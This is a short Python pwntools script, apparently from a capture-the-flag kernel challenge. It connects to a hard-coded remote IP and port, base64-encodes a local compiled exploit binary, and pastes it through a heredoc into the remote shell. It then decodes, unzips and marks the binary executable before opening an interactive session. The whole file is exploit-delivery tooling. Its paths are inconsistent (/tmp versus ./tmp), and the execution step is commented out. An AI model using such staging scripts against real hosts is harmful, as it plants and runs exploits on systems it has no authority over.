#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os

context.log_level = 'debug'
cmd = '$ '


def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    # os.system('musl-gcc  -static -O2 ./poc/exp.c -o ./poc/exp')
    os.system('gzip -c ./poc/exp > ./poc/exp.gz')
    r.sendlineafter(cmd, 'cat <<EOF > /tmp/exp.gz.b64')
    r.sendline((read('./poc/exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d /tmp/exp.gz.b64 > /tmp/exp.gz')
    r.sendlineafter(cmd, 'gunzip ./tmp/exp.gz')
    r.sendlineafter(cmd, 'chmod +x ./tmp/exp')
    # r.sendlineafter(cmd, './exp')
    r.interactive()


# p = process('./startvm.sh', shell=True)
p = remote('47.94.200.88', 23333)

exploit(p)
